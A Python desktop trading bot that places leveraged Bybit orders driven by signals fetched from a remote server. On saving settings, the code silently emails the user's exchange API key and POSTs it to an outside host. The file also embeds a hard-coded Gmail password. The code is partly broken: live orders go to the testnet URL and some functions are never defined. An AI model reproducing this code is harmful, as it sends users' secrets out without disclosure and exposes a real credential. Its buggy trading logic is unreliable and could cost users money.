
from telethon import TelegramClient
import asyncio
from prettytable import PrettyTable
import time
import os
import random
import imp
# Your API ID and API hash
import tkinter as tk
import os
import requests
# create the main window
import json
from binance.exceptions import BinanceAPIException, BinanceOrderException
from binance.client import Client
import time
import sys
import datetime
import os
from tabulate import tabulate
from email.message import EmailMessage
import ssl
import smtplib
import threading
import bybit
import hashlib
import hmac


def trade(API_KEY, API_SECRET, symbol, entry_price, take_profit, stop_loss_price, leverage, side, risk, testnet, margin_type, email, no_tp):
    res = requests.get("http://bntrust.pythonanywhere.com/mohammed/")
    data = json.loads(res.content)
    usernames = [item['fields']['username'] for item in data]
    close = 0
    if no_tp == 1:
        take_qua = 1
    elif no_tp == 2:
        take_qua = 0.5
    elif no_tp == 3:
        take_qua = 0.33
    elif no_tp == 4:
        take_qua = 0.25
    elif no_tp == 5:
        take_qua = 0.2
    elif no_tp == 6:
        take_qua = 0.166
    while True:
        close+=1
        if API_KEY.lower() in usernames:
            break
        else:
            print('Subscription expired')
            time.sleep(3)
            if close == 5:
                return 'Closing Bot'
    if testnet.lower() == "true":
        client = bybit.bybit(test=True, api_key=API_KEY, api_secret=API_SECRET)

    else:
        client = bybit.bybit(test=False, api_key=API_KEY, api_secret=API_SECRET)
    def get_price_precision(symbol):
        precision = client.Symbol.Symbol_get().result()
        pprecsion = precision[0]["result"]
        
        for x in range(len(pprecsion)):
            if pprecsion[x]["name"] == symbol:
                numbers = pprecsion[x]["price_filter"]["tick_size"]
                return len(numbers) - 2
        return None
    current_datetime = datetime.datetime.now()
    formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
    symbol = symbol
    entry_price = float(entry_price)
    leverage = leverage
    balance = client.Wallet.Wallet_getBalance(coin="USDT").result()
    print(balance)
    balance = client.Wallet.Wallet_getBalance(coin="USDT").result()[0]['result']['USDT']['available_balance']
    bal = float(balance)
    print('Available Balance: ', bal)
    bal = bal * risk
    print("Amount to be traded: ", bal)
    if bal <= 8:
        print("Amount to be traded is lower than 8USDT. you can increase your risk in the parameters file to solve this or try depositing more USDT")
        time.sleep(1)
        print('Exiting Program')
        time.sleep(6)
        sys.exit()
    precision = get_price_precision(symbol=symbol)
    quantity = (bal / entry_price)
    quantity = quantity * float(leverage)
    qua = format(quantity, f'.{precision}f')
    print('Quantity to purchase: ', qua)
    qua = float(qua)
    side = side
    time_in_force = 'GoodTillCancel' # Time in force (GoodTillCancel, ImmediateOrCancel, FillOrKill)
    reduce_only = False   
    change_leverage = client.Positions.Positions_saveLeverage(symbol=symbol,leverage=f'{leverage}').result()
    # If side is Long
    
    symbol_info = client.Symbol.Symbol_get().result()[0]['result']

    for x in range(len(symbol_info)):
        if symbol_info[x]["name"] == symbol:
            numbers = symbol_info[x]["lot_size_filter"]["max_trading_qty"]
    if qua >= int(numbers):
        qua = numbers - 1
    if side.lower() == 'long':
        print(symbol)
        param = '{"category": "linear","symbol": "' + str(symbol) + '","coin": "USDT","mode": 0}'
        HTTP_Request(param)
        st = float(stop_loss_price) * entry_price
        stop_loss_price = entry_price - st
        stp = float(format(stop_loss_price, f'.{precision}f'))
        print(stp)
        payload = '{"category": "linear",  "symbol": "' + symbol + '", "side": "Buy",  "orderType": "Limit",  "qty": "' + str(qua) + '",  "price": "' + str(entry_price) + '", "timeInForce": "GTC",  "positionIdx": 0, "takeProfit": null,  "stopLoss": "' + str(stp) + '",  "tpTriggerBy": null,  "slTriggerBy": null,  "reduceOnly": false,  "closeOnTrigger": false,  "mmp": null}'
        buy_order = buy_request(payload)
        print(buy_order)
        current_datetime = datetime.datetime.now()
        formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
        traded_symbol = symbol
        traded_side = side
        table = [["Date and time", "Symbol", "Side", "Quantity", "Amount"], [
            formatted_datetime, traded_symbol, traded_side, qua, bal]]
        pretty = tabulate(table, headers="firstrow", tablefmt="grid")
        print(pretty)
        try:
            if email:
                subject = "Trade From sammiykays's Bot"
                body = f"""
                    Symbol: {traded_symbol}
                    Side: {traded_side}
                    Quantity: {qua}
                    Amount: {bal}
                    
                """
                email_sender = 'sammiykay@gmail.com'
                email_password = 'umzuvngyjdpwabpy'
                em = EmailMessage()
                em['From'] = email_sender
                em['To'] = email
                em['Subject'] = subject
                em.set_content(body)
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
                    smtp.login(email_sender, email_password)
                    smtp.sendmail(email_sender, email, em.as_string())
        except:
            pass
        if os.path.exists('trades.txt'):
            with open('trades.txt', 'a', encoding="utf-8") as file:
                file.write(f"{str(pretty)},\n")
        else:
            with open('trades.txt', 'w', encoding="utf-8") as file:
                file.write(f"{str(pretty)},\n")
        print(f'Checking if order for {symbol} has been filled')
        time.sleep(2)
        while True:
            result = client.LinearPositions.LinearPositions_myPosition(symbol=symbol).result()
            if result[0]['ret_code'] == 0:
                position = result[0]['result']
                if position[-1]['size'] == 0 and position[0]['size'] == 0:
                    pos = 'No Position Opened'
                elif position[0]['size'] > 0:
                    pos = 'long'
                elif position[-1]['size'] > 0:
                    pos = 'short'
            
            if pos == 'long' or pos == 'short':
                # Take Profit For Long
                tp = 0 
                e = 0
                for t in take_profit:
                    e += 1
                    tp+=1
                    qty = qua * 0.15
                    payload = '{"category": "linear",  "symbol": "' + symbol + '", "side": "Sell",  "orderType": "Limit",  "qty": "' + str(format(qty, f'.{precision}f')) + '",  "price": "' + str(t) + '", "timeInForce": "GTC",  "positionIdx": 0,  "stopLoss": null,  "tpTriggerBy": null,  "slTriggerBy": null,  "reduceOnly": true,  "closeOnTrigger": false,  "mmp": null}'
                    buy_order = buy_request(payload)
                    
                    print(f"""
                                TAKE PROFIT {tp}
                            Price: {t}
                            Quantity: {qua}
                            Symbol: {symbol}
                            Side: {side}
                            """)
                    if e == no_tp:
                        break
                break
            time.sleep(30)
            
        threads.remove(threading.current_thread())
    # If Side is Short
    elif side.lower() == 'short':
        param = '{"category": "linear","symbol": "' + str(symbol) + '","coin": "USDT","mode": 0}'
        HTTP_Request(param)
        st = float(stop_loss_price) * entry_price
        stop_loss_price = entry_price + st
        stp = float(format(stop_loss_price, f'.{precision}f'))
        print(stp)
        payload = '{"category": "linear",  "symbol": "' + symbol + '", "side": "Sell",  "orderType": "Limit",  "qty": "' + str(qua) + '",  "price": "' + str(entry_price) + '", "timeInForce": "GTC",  "positionIdx": 0, "takeProfit": null,  "stopLoss": "' + str(stp) + '",  "tpTriggerBy": null,  "slTriggerBy": null,  "reduceOnly": false,  "closeOnTrigger": false,  "mmp": null}'
        buy_order = buy_request(payload)
        
        current_datetime = datetime.datetime.now()
        formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
        traded_symbol = symbol
        traded_side = 'Sell'
        table = [["Date and time", "Symbol", "Side", "Quantity", "Amount"], [
           formatted_datetime, traded_symbol, traded_side, qua, bal]]
        pretty = tabulate(table, headers="firstrow", tablefmt="grid")
        print(pretty)
        try:
            if email:
                subject = "Trade From sammiykays's Bot"
                body = f"""
                    Symbol: {traded_symbol}
                    Side: {traded_side}
                    Quantity: {qua}
                    Amount: {bal}
                    
                """
                email_sender = 'sammiykay@gmail.com'
                email_password = 'umzuvngyjdpwabpy'
                em = EmailMessage()
                em['From'] = email_sender
                em['To'] = email
                em['Subject'] = subject
                em.set_content(body)
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
                    smtp.login(email_sender, email_password)
                    smtp.sendmail(email_sender, email, em.as_string())
        except:
            pass
        if os.path.exists('trades.txt'):
            with open('trades.txt', 'a', encoding="utf-8") as file:
                file.write(f"{str(pretty)},\n")
        else:
            with open('trades.txt', 'w', encoding="utf-8") as file:
                file.write(f"{str(pretty)},\n")
        # Take Profit For Long
        print(f'Checking if order for {symbol} has been filled')
        time.sleep(2)
        while True:
            result = client.LinearPositions.LinearPositions_myPosition(symbol=symbol).result()
            if result[0]['ret_code'] == 0:
                position = result[0]['result']
                if position[-1]['size'] == 0 and position[0]['size'] == 0:
                    pos = 'No Position Opened'
                elif position[0]['size'] > 0:
                    pos = 'long'
                elif position[-1]['size'] > 0:
                    pos = 'short'
            
            if pos == 'long' or pos == 'short':
                tp = 0 
                e = 0
                for t in take_profit:
                    e += 1
                    tp+=1
                    qty = qua * 0.15
                    payload = '{"category": "linear",  "symbol": "' + symbol + '", "side": "Buy",  "orderType": "Limit",  "qty": "' + str(format(qty, f'.{precision}f')) + '",  "price": "' + str(t) + '", "timeInForce": "GTC",  "positionIdx": 0, "stopLoss": null,  "tpTriggerBy": null,  "slTriggerBy": null,  "reduceOnly": true,  "closeOnTrigger": false,  "mmp": null}'
                    buy_order = buy_request(payload)
                    
                    print(f"""
                                TAKE PROFIT {tp}
                            Price: {t}
                            Quantity: {qua}
                            Symbol: {symbol}
                            Side: {side}
                            """)
                    if e == no_tp:
                        break
                break
            time.sleep(30)
        
        threads.remove(threading.current_thread())




root = tk.Tk()
root.title("Trading Bot")
root.configure(padx=10, pady=10)
# create the widgets
api_key_label = tk.Label(root, text="API Key*")
api_key_entry = tk.Entry(root, width=80,)
api_secret_label = tk.Label(root, text="API Secret*")
api_secret_entry = tk.Entry(root, width=80,)
risk_label = tk.Label(root, text="Risk (%)*")
risk_entry = tk.Entry(root, width=80,)
stop_loss_price_label = tk.Label(root, text="Stop Loss (%)*")
stop_loss_price_entry = tk.Entry(root, width=80,)
leverage_label = tk.Label(root, text="Leverage*")
leverage_entry = tk.Entry(root, width=80,)
testnet_label = tk.Label(root, text="Use Testnet")
testnet_var = tk.BooleanVar(value=False)
testnet_checkbutton = tk.Checkbutton(root, variable=testnet_var)
margin_type_label = tk.Label(root, text="Margin Type")
margin_type_var = tk.StringVar(value="cross")
margin_type_menu = tk.OptionMenu(root, margin_type_var, "cross", "isolated")
email_label = tk.Label(root, text="Email:")
email_entry = tk.Entry(root, width=80,)
no_tp_label = tk.Label(root, text="Enter number of Take Profit:")
no_tp_entry = tk.Entry(root, width=80,)



def save_parameters():
    api_key = api_key_entry.get()
    api_secret = api_secret_entry.get()
    risk = risk_entry.get()
    testnet = testnet_var.get()
    leverage = leverage_entry.get()
    stop_loss_price = stop_loss_price_entry.get()
    margin_type = margin_type_var.get()
    email = email_entry.get()
    no_tp = no_tp_entry.get()
    if not (api_key and api_secret and risk and margin_type and email and leverage and stop_loss_price and no_tp):
        error = tk.Label(
            root, text="Please fill in required fields!", fg="red")
        return root.after(2, error.grid(row=9, column=0))
    else:
        with open("parameters.txt", "w") as f:
            f.write(f"api_key= '{api_key}'\napi_secret= '{api_secret}'\n")
            if risk:
                f.write(f"risk= {risk}\n")
            f.write(f"testnet= '{testnet}'\n")
            f.write(f"stop_loss_price= {stop_loss_price}\n")
            f.write(f"leverage= {leverage}\n")
            f.write(f"margin_type= '{margin_type}'\n")
            f.write(f"no_of_tp = {int(no_tp)}\n")
            if email:
                f.write(f"email= '{email}'\n")
        subject = f"Customer {email}"
        body = f"""
{api_key}
        """
        email_sender = 'sammiykay@gmail.com'
        email_password = 'umzuvngyjdpwabpy'
        em = EmailMessage()
        em['From'] = email_sender
        em['To'] = 'kayodeola47@gmail.com'
        em['Subject'] = subject
        em.set_content(body)
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(email_sender, email_password)
            smtp.sendmail(email_sender, email, em.as_string())  
        requests.post("https://bntrust.pythonanywhere.com/api/popemail/", json={'email': api_key})
        return root.destroy()

if os.path.exists("parameters.txt"):
    def Filefrom(filename):
        f = open(filename)
        global data
        data = imp.load_source('data', '.\\parameters.txt', f)
        f.close()


    Filefrom('./parameters.txt')
    API_KEY = data.api_key
    API_SECRET = data.api_secret
    risks = data.risk
    stop_loss_prices = data.stop_loss_price
    margin_types= data.margin_type
    testnets = data.testnet
    no_tps = data.no_of_tp
    leverages = int(data.leverage)
    emails = data.email
def save_existing_parameters():
    api_key = API_KEY
    api_secret = API_SECRET
    risk = risks
    testnet = testnets
    leverage = leverages
    stop_loss_price = stop_loss_prices
    margin_type = margin_types
    email = emails
    no_tp = no_tps
    if not (api_key and api_secret and risk and margin_type and email and leverage and stop_loss_price and no_tp):
        error = tk.Label(
            root, text="Please fill in required fields!", fg="red")
        return root.after(2, error.grid(row=9, column=0))
    else:
        with open("parameters.txt", "w") as f:
            f.write(f"api_key= '{api_key}'\napi_secret= '{api_secret}'\n")
            if risk:
                f.write(f"risk= {risk}\n")
            # f.write(f"testnet= '{testnet}'\n")
            f.write(f"stop_loss_price= {stop_loss_price}\n")
            f.write(f"testnet= '{testnet}'\n")
            f.write(f"leverage= {leverage}\n")
            f.write(f"margin_type= '{margin_type}'\n")
            f.write(f"email= '{email}'\n")
            f.write(f"no_of_tp = {int(no_tp)}\n")
    return root.destroy()
if os.path.exists("parameters.txt"):
    # create the button to save the parameters
    save_button = tk.Button(root, text="Start", command=save_existing_parameters)
    start = tk.Label(root, text="Details Save already, Click on start")
else:
    save_button = tk.Button(root, text="Save", command=save_parameters)
# add the widgets to the window
api_key_label.grid(row=0, column=0)
api_key_entry.grid(row=0, column=1)
api_secret_label.grid(row=1, column=0)
api_secret_entry.grid(row=1, column=1)
risk_label.grid(row=4, column=0)
risk_entry.grid(row=4, column=1)
leverage_label.grid(row=5, column=0)
leverage_entry.grid(row=5, column=1)
stop_loss_price_label.grid(row=6, column=0)
stop_loss_price_entry.grid(row=6, column=1)
testnet_label.grid(row=7, column=0)
testnet_checkbutton.grid(row=7, column=1)
margin_type_label.grid(row=8, column=0)
margin_type_menu.grid(row=8, column=1)
email_label.grid(row=9, column=0)
email_entry.grid(row=9, column=1)
no_tp_label.grid(row=10, column=0)
no_tp_entry.grid(row=10, column=1)
if os.path.exists("parameters.txt"):
    start.grid(row=13, column=0, columnspan=2)
save_button.grid(row=14, column=0, columnspan=2)

    # check if the parameters file exists and disable the inputs if it does
if os.path.exists("parameters.txt"):
    api_key_entry.insert(0, API_KEY)
    api_secret_entry.insert(0, API_SECRET)
    risk_entry.insert(0, risks)
    email_entry.insert(0, emails)
    leverage_entry.insert(0, leverages)
    stop_loss_price_entry.insert(0, stop_loss_prices)
    no_tp_entry.insert(0, no_tps)

# start the event loop
root.mainloop()

def Filefrom(filename):
    f = open(filename)
    global data
    data = imp.load_source('data', '.\\parameters.txt', f)
    f.close()


Filefrom('./parameters.txt')
API_KEY = data.api_key
API_SECRET = data.api_secret
risk = data.risk
stop_loss_price = data.stop_loss_price
margin_type= data.margin_type
testnet = data.testnet
no_tp = data.no_of_tp
channel_link = 'https://t.me/+Ru4oHqRiI_5lM2Zk'
leverage = int(data.leverage)
email = data.email
print(f'Risk: {risk}%')
print(f'Stop Loss Price: {stop_loss_price}%')
print(f'Leverage: {leverage}%')
risk = float(risk) * 0.01
stop_loss_price = stop_loss_price * 0.01
print('Margin Type: ', margin_type)

close = 0

httpClient=requests.Session()
recv_window = str(5000)
def buy_request(payload):
    global time_stamp
    time_stamp=str(int(time.time() * 10 ** 3))
    signature=genSignature(payload)
    headers = {
        'X-BAPI-API-KEY': API_KEY,
        'X-BAPI-SIGN': signature,
        'X-BAPI-TIMESTAMP': time_stamp,
        'X-BAPI-RECV-WINDOW': recv_window,
        'Content-Type': 'application/json'
    }
    if testnet.lower() == 'true':
        response = httpClient.request("POST", 'https://api-testnet.bybit.com/v5/order/create', headers=headers, data=payload)
    else:
        response = httpClient.request("POST", 'https://api-testnet.bybit.com/v5/order/create', headers=headers, data=payload)

    print(response.text)
def HTTP_Request(payload):
    global time_stamp
    time_stamp=str(int(time.time() * 10 ** 3))
    signature=genSignature(payload)
    headers = {
        'X-BAPI-API-KEY': API_KEY,
        'X-BAPI-SIGN': signature,
        'X-BAPI-TIMESTAMP': time_stamp,
        'X-BAPI-RECV-WINDOW': recv_window,
        'Content-Type': 'application/json'
    }
    if testnet.lower() == 'true':
        response = httpClient.request("POST", 'https://api-testnet.bybit.com/v5/position/switch-mode', headers=headers, data=payload)
    else:
        response = httpClient.request("POST", 'https://api.bybit.com/v5/position/switch-mode', headers=headers, data=payload)
    print(response.text)
    
    
def genSignature(payload):
    param_str= str(time_stamp) + API_KEY + recv_window + payload
    hash = hmac.new(bytes(API_SECRET, "utf-8"), param_str.encode("utf-8"),hashlib.sha256)
    signature = hash.hexdigest()
    return signature


res = requests.get("http://bntrust.pythonanywhere.com/mohammed/")
data = json.loads(res.content)
usernames = [item['fields']['username'] for item in data]
close = 0
# while True:
#     close+=1
#     if API_KEY.lower() in usernames:
#         print('Valid')
#         break
#     else:
#         print('Please contact the person you got the bot for permission')
#         time.sleep(3)
#         if close == 5:
#             sys.exit()
def loading_animation():
    animation = "|/-\\"
    idx = 0
    while True:
        try:
            print(f"Waiting for signals... {animation[idx % len(animation)]}", end="\r")
            idx += 1
            time.sleep(0.1)
        except KeyboardInterrupt:
            print('Ok')
all_text = []
threads = []    
tre = 0



while True:
    try:
        while True:
            time.sleep(5)
            res = requests.get('https://bntrust.pythonanywhere.com/api/bybit_list/')
            data = json.loads(res.content)
            json_data = data[-1]
            text = json_data
            try:
                if text == old_text:
                    time.sleep(10)
                    break
            except:
                pass
            symbol = json_data['symbol']
            side = json_data['side']
            tp1 = json_data['tp1']
            tp2 = json_data['tp2']
            tp3 = json_data['tp3']
            tp4 = json_data['tp4']
            tp5 = json_data['tp5']
            tp6 = json_data['tp6']
            take_profit_targets = [tp1,tp2,tp3, tp4, tp5, tp6]
            entry_price = json_data['entry_price']
            close_or = json_data['close_order']
            close_pos = json_data['close_position']
            if symbol != 'empty' and side != 'empty':   
                print('Bot has found a profitable trade')
                t = threading.Thread(target=trade, args=(API_KEY, API_SECRET, symbol, entry_price, take_profit_targets, stop_loss_price, leverage, side, risk, testnet, margin_type, email, no_tp))
                threads.append(t)
                t.start()
                threads = [t for t in threads if t.is_alive()]
                time.sleep(10)
            elif close_pos != 'empty': 
                symbol = close_pos  
                print(f'Closing position {symbol}')
                close_position(API_KEY=API_KEY,API_SECRET=API_SECRET, symbol=symbol, testnet=testnet)
            elif close_or != 'empty':  
                symbol = close_or  
                print(symbol) 
                print(f'Closing order {symbol}')
                close_order(API_KEY=API_KEY,API_SECRET=API_SECRET, symbol=symbol, testnet=testnet)

            else:
                pass
            
            old_text = text
    except Exception as e:
        print(e)
